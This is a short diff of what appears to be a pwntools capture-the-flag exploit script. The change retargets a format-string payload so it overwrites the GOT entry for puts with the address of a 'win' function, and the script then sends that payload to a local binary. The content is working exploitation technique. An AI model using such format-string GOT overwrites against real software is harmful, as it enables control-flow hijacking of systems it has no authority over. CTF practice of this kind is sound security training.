@@ -4,7 +4,7 @@ p = process(binary.path)
 
 offset = 7
 
-payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
+payload = fmtstr_payload(offset,{binary.got.puts:binary.sym.win})
 p.sendline(payload)
 
 #null = payload.find(b'\x00')
